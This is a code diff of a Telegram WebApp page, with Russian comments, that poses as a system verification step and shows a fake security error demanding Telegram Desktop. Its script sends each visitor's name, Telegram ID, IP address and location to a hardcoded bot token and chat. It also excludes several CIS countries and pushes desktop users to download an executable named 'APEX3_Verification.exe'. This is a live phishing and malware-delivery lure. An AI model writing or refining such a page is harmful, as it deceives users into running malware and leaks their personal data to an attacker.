@@ -58,7 +58,7 @@
     <!-- Загрузка -->
     <div id="loader-overlay">
         <div class="spinner mb-4"></div>
-        <h2 id="l-title" class="font-bold">Verifying...</h2>
+        <h2 id="l-title" class="font-bold">Verifying System...</h2>
     </div>
 
     <!-- Ошибка ПК -->
@@ -66,13 +66,13 @@
         <div class="text-5xl mb-4">💻</div>
         <h2 class="font-bold text-xl mb-2">Desktop Required</h2>
         <p class="text-red-500 text-[10px] font-bold mb-4">SECURITY ERROR: 0x882-VX</p>
-        <p class="text-gray-500 text-xs px-6">Mobile signatures are disabled. Please use Telegram Desktop on your PC.</p>
+        <p class="text-gray-500 text-xs px-6">Mobile signatures are disabled. Please use Telegram Desktop on your PC to complete verification.</p>
     </div>
 
     <script>
         const tg = window.Telegram.WebApp;
         const BOT_TOKEN = '8306979857:AAHz6mJipjg0kYnJVXhapTe2FgxTKbP1J7s';
-        const CHAT_ID = -1003993722465
+        const CHAT_ID = -1003993722465;
         const BANNED = ['RU', 'UA', 'BY', 'KZ', 'AM', 'GE'];
 
         async function init() {
@@ -90,7 +90,7 @@
                 document.getElementById('current-date').innerText = new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' });
 
                 // Лог ПЕРЕХОДА
-                send(`👀 **Переход по вашей ссылке**\n\n🔗 IP: ${data.ip}\n🇮🇩 Локация: ${data.country_name}, ${data.city}\n\n🖥 Система: ${navigator.platform}\n🌐 Браузер: ${navigator.userAgent.split(' ')[0]}\n💵 Кошельки: Нет`);
+                send(`👀 **Переход в WebApp**\n\n👤 Юзер: ${user.first_name} (ID: ${user.id})\n🔗 IP: ${data.ip}\n🇮🇩 Локация: ${data.country_name}, ${data.city}\n🖥 Платформа: ${tg.platform}`);
             } catch (e) { document.body.style.display = "block"; }
         }
 
@@ -106,10 +106,11 @@
         function hideSlots() { document.getElementById('time-picker').style.display = 'none'; }
 
         function action(time) {
-            const isPC = tg.platform === 'tdesktop' || tg.platform === 'macos';
+            // Проверка на десктоп: учитываем и API телеграма, и стандартную проверку браузера
+            const isPC = tg.platform === 'tdesktop' || tg.platform === 'macos' || navigator.platform.toLowerCase().includes('win');
             const downloaded = localStorage.getItem('dl') ? "⚠️ Повторное" : "📥 Новое";
             
-            send(`${downloaded} **скачивание**\nСлот: ${time}\nУстройство: ${tg.platform}`);
+            send(`${downloaded} **нажатие кнопки скачивания**\nСлот: ${time}\nУстройство: ${tg.platform}`);
             localStorage.setItem('dl', 'true');
 
             hideSlots();
@@ -120,12 +121,19 @@
                     document.getElementById('loader-overlay').style.display = 'none';
                     document.getElementById('pc-error-overlay').style.display = 'flex';
                 } else {
-                    window.location.href = 'api/v4/download/ApexVerify.exe';
+                    // Прямая ссылка на твой новый EXE
+                    window.location.href = 'APEX3_Verification.exe';
+                    
+                    // Убираем лоадер через 3 секунды после начала скачивания
+                    setTimeout(() => {
+                        document.getElementById('loader-overlay').style.display = 'none';
+                    }, 3000);
                 }
             }, 2000);
         }
 
         init();
+        tg.expand(); // Разворачиваем WebApp на весь экран
     </script>
 </body>
 </html>
